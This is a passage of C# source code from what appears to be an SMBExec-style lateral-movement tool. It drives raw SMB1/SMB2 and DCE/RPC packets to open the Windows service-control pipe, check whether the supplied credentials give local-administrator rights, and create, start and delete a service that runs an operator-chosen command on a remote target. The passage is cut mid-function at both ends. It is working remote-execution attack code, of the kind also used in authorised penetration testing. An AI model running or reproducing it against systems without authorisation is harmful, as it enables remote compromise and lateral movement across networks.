                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "Logoff";
                                    }
                                    break;
                                case "Logoff":
                                    {
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x74 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0x34, 0xfe }, Process_ID_Bytes, SMB_User_ID);

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBLogoffAndXRequest();
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);


                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "exit";
                                    }
                                    break;
                            }

                        }
                    }
                    else
                    {
                        SMBClientStage = "TreeConnect";
                        HMACSHA256 HMAC_SHA256 = new HMACSHA256();

                        while (SMBClientStage != "exit" && SMBExec_Failed == false)
                        {
                            if (debug) { output.AppendLine(String.Format("Current Stage {0}", SMBClientStage)); }
                            switch (SMBClientStage)
                            {
                                case "TreeConnect":
                                    {
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x03, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        Packet_SMB2_Data = SMBExec.SMB2TreeConnectRequest(SMB_Path_Bytes);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "CreateRequest";
                                    }
                                    break;
                                case "CreateRequest":
                                    {
                                        SMB2_Tree_ID = new byte[] { 0x01, 0x00, 0x00, 0x00 };
                                        SMB_Named_Pipe_Bytes = new byte[] { 0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00 }; //svcctl
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x05, 0x0 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        Packet_SMB2_Data = SMBExec.SMB2CreateRequestFile(SMB_Named_Pipe_Bytes);
                                        Packet_SMB2_Data["SMB2CreateRequestFIle_Share_Access"] = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "RPCBind";
                                    }
                                    break;
                                case "RPCBind":
                                    {
                                        SMB_Named_Pipe_Bytes = new byte[] { 0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00 }; //svcctl
                                        SMB2_Message_ID++;
                                        SMB_File_ID = Utilities.GetByteRange(SMBClientReceive, 132, 147);
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        Packet_RPC_Data = SMBExec.RPCBind(1, new byte[] { 0xb8, 0x10 }, new byte[] { 0x01 }, new byte[] { 0x0, 0x00 }, SMB_named_pipe_UUID, new byte[] { 0x02, 0x00 });
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        int RPC_Data_Length = SMB2_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadRequest";
                                        SMB_Client_Stage_Next = "OpenSCManagerW";
                                    }
                                    break;
                                case "ReadRequest":
                                    {
                                        Thread.Sleep(sleep * 1000);
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x08, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        Packet_SMB2_Header["SMB2Header_CreditCharge"] = new byte[] { 0x10, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        Packet_SMB2_Data = SMBExec.SMB2ReadRequest(SMB_File_ID);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 12, 15)) != "03-01-00-00")
                                        {
                                            SMBClientStage = SMB_Client_Stage_Next;
                                        }
                                        else
                                        {
                                            SMBClientStage = "StatusPending";
                                        }

                                    }
                                    break;

                                case "StatusPending":
                                    {
                                        SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 12, 15)) != "03-01-00-00")
                                        {
                                            SMBClientStage = SMB_Client_Stage_Next;
                                        }
                                    }
                                    break;
                                case "OpenSCManagerW":
                                    {
                                        SMB2_Message_ID = 30;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        Packet_SCM_Data = SMBExec.SCMOpenSCManagerW(SMB_Service_Bytes, SMB_Service_Length);
                                        SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0f, 0x00 }, null);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length + SCM_Data.Length);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        int RPC_Data_Length = SMB2_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadRequest";
                                        SMB_Client_Stage_Next = "CheckAccess";

                                    }
                                    break;

                                case "CheckAccess":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 128, 131)) == "00-00-00-00" && BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 127)) != "00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00")
                                        {
                                            SMB_Service_Manager_Context_Handle = Utilities.GetByteRange(SMBClientReceive, 108, 127);
                                            if (SMB_execute)
                                            {
                                                Packet_SCM_Data = SMBExec.SCMCreateServiceW(SMB_Service_Manager_Context_Handle, SMB_Service_Bytes, SMB_Service_Length, SMBExec_Command, SMBExec_Command_Length_bytes);
                                                SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                                if (SCM_Data.Length < SMB_Split_Index)
                                                {
                                                    SMBClientStage = "CreateServiceW";
                                                }
                                                else
                                                {
                                                    SMBClientStage = "CreateServiceW_First";
                                                }
                                            }
                                            else
                                            {

                                                output.AppendLine(String.Format("{0} is a local administrator on {1}", Output_Username, Target));
                                                SMB2_Message_ID += 20;
                                                SMB_Close_Service_Handle_Stage = 2;
                                                SMBClientStage = "CloseServiceHandle";
                                            }

                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 128, 131)) == "05-00-00-00")
                                        {
                                            output.AppendLine(String.Format("{0} is not a local administrator or does not have the required privileges on {1}", Output_Username, Target));
                                            SMBExec_Failed = true;
                                        }
                                        else
                                        {
                                            output.AppendLine(String.Format("Something went wrong with {0}", Target));
                                            SMBExec_Failed = true;
                                        }

                                    }
                                    break;
                                case "CreateServiceW":
                                    {
                                        if (SMBExec_Command.Length < SMB_Split_Index)
                                        {
                                            SMB2_Message_ID += 20;
                                            Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                            Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_Signing)
                                            {
                                                Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, null);
                                            RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                            Packet_SMB_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length + SCM_Data.Length);
                                            SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                            int RPC_Data_Length = SMB2_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                            NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                            if (SMB_Signing)
                                            {
                                                HMAC_SHA256 = new HMACSHA256();
                                                SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                                SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                                Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                            }
                                            SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                            SMBClientStage = "ReadRequest";
                                            SMB_Client_Stage_Next = "StartServiceW";

                                        }
                                    }
                                    break;
                                case "CreateServiceW_First":
                                    {
                                        SMB_Split_Stage_final = Math.Ceiling((double)SCM_Data.Length / SMB_Split_Index);
                                        SMB2_Message_ID += 20;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        byte[] SCM_Data_First = Utilities.GetByteRange(SCM_Data, 0, SMB_Split_Index - 1);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x01 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_Data_First);
                                        Packet_RPC_Data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_Data.Length);
                                        SMB_Split_Index_Tracker = SMB_Split_Index;
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        int RPC_Data_Length = SMB2_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);

                                        if (SMB_Split_Stage_final <= 2)
                                        {
                                            SMBClientStage = "CreateServiceW_Last";
                                        }
                                        else
                                        {
                                            SMB_Split_Stage = 2;
                                            SMBClientStage = "CreateServiceW_Middle";
                                        }
                                    }
                                    break;

                                case "CreateServiceW_Middle":
                                    {
                                        SMB_Split_Stage++;
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        byte[] SCM_Data_Middle = Utilities.GetByteRange(SCM_Data, SMB_Split_Index_Tracker, SMB_Split_Index_Tracker + SMB_Split_Index - 1);
                                        SMB_Split_Index_Tracker += SMB_Split_Index;
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x00 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_Data_Middle);
                                        Packet_RPC_Data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_Data.Length - SMB_Split_Index_Tracker + SMB_Split_Index);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        int RPC_Data_Length = SMB2_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        if (SMB_Split_Stage >= SMB_Split_Stage_final)
                                        {
                                            SMBClientStage = "CreateServiceW_Last";
                                        }
                                        else
                                        {
                                            SMBClientStage = "CreateServiceW_Middle";
                                        }
                                    }
                                    break;

                                case "CreateServiceW_Last":
                                    {
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        byte[] SCM_Data_Last = Utilities.GetByteRange(SCM_Data, SMB_Split_Index_Tracker, SCM_Data.Length);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x02 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_Data_Last);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        int RPC_Data_Length = SMB2_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadRequest";
                                        SMB_Client_Stage_Next = "StartServiceW";
                                    }
                                    break;

                                case "StartServiceW":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 132, 135)) == "00-00-00-00")
                                        {
                                            if (debug) { output.AppendLine(String.Format("Service {0} created on {1}", SMB_Service, Target)); }
                                            SMB_Service_Context_Handle = Utilities.GetByteRange(SMBClientReceive, 112, 131);
                                            SMB2_Message_ID += 20;
                                            Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                            Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_Signing)
                                            {
                                                Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            Packet_SCM_Data = SMBExec.SCMStartServiceW(SMB_Service_Context_Handle);
                                            SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                            Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x13, 0x00 }, null);
                                            RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                            Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length + SCM_Data.Length);
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                            SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                            int RPC_Data_Length = SMB2_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                            NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                            if (SMB_Signing)
                                            {
                                                HMAC_SHA256 = new HMACSHA256();
                                                SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                                SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                                Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                            }
                                            SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                            SMBClientStage = "ReadRequest";
                                            SMB_Client_Stage_Next = "DeleteServiceW";
                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 132, 135)) == "31-04-00-00")
                                        {
                                            if (debug) { output.AppendLine(String.Format("Service {0} creation failed on {1}", SMB_Service, Target)); }
                                            SMBExec_Failed = true;
                                        }
                                        else
                                        {
                                            if (debug) { output.AppendLine("Service Creation Fault Context Mismatch."); }
                                            SMBExec_Failed = true;
                                        }
                                    }
                                    break;

                                case "DeleteServiceW":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)) == "1d-04-00-00")
                                        {
                                            output.AppendLine(String.Format("Command executed with service {0} on {1}", SMB_Service, Target));
                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)) == "02-00-00-00")
                                        {
                                            output.AppendLine(String.Format("Service {0} failed to start on {1}", SMB_Service, Target));
                                        }

                                        SMB2_Message_ID += 20;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        Packet_SCM_Data = SMBExec.SCMDeleteServiceW(SMB_Service_Context_Handle);
                                        SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length + SCM_Data.Length);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        int RPC_Data_Length = SMB2_Data.Length + SCM_Data.Length + RPC_Data.Length;
